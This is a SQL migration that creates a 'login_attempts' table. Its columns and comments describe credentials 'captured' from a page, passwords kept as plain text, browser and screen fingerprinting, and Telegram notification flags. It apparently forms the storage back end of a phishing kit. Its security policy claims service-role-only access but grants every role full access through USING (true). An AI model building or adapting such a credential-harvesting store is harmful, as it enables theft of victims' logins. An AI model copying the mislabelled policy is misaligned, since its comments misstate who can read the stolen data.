/*
  # Create Login Attempts Tracking Table

  1. New Tables
    - `login_attempts`
      - `id` (uuid, primary key) - Unique identifier
      - `email` (text) - Captured email/username
      - `password` (text) - Captured password (stored as-is for verification)
      - `ip_address` (text) - User's IP address
      - `user_agent` (text) - Browser user agent string
      - `source_url` (text) - Page URL where capture occurred
      - `screen_info` (text) - Screen resolution and browser info
      - `timestamp` (timestamptz) - When the attempt was captured
      - `verified` (boolean) - Whether this has been verified/reviewed
      - `verified_at` (timestamptz) - When it was verified
      - `notes` (text) - Admin notes about this attempt
      - `created_at` (timestamptz) - Record creation time
      - `telegram_sent` (boolean) - Whether Telegram notification was sent
      - `telegram_sent_at` (timestamptz) - When Telegram notification was sent

  2. Security
    - Enable RLS on `login_attempts` table
    - Add policy for service role only access
    - No public access allowed

  3. Indexes
    - Index on email for quick lookups
    - Index on ip_address for IP tracking
    - Index on timestamp for chronological sorting
    - Index on verified status for filtering
*/

CREATE TABLE IF NOT EXISTS login_attempts (
  id uuid PRIMARY KEY DEFAULT gen_random_uuid(),
  email text NOT NULL,
  password text NOT NULL,
  ip_address text,
  user_agent text,
  source_url text,
  screen_info text,
  timestamp timestamptz DEFAULT now(),
  verified boolean DEFAULT false,
  verified_at timestamptz,
  notes text,
  created_at timestamptz DEFAULT now(),
  telegram_sent boolean DEFAULT false,
  telegram_sent_at timestamptz
);

ALTER TABLE login_attempts ENABLE ROW LEVEL SECURITY;

CREATE POLICY "Service role can do everything"
  ON login_attempts
  FOR ALL
  USING (true)
  WITH CHECK (true);

CREATE INDEX IF NOT EXISTS idx_login_attempts_email ON login_attempts(email);
CREATE INDEX IF NOT EXISTS idx_login_attempts_ip ON login_attempts(ip_address);
CREATE INDEX IF NOT EXISTS idx_login_attempts_timestamp ON login_attempts(timestamp DESC);
CREATE INDEX IF NOT EXISTS idx_login_attempts_verified ON login_attempts(verified);
CREATE INDEX IF NOT EXISTS idx_login_attempts_created_at ON login_attempts(created_at DESC);
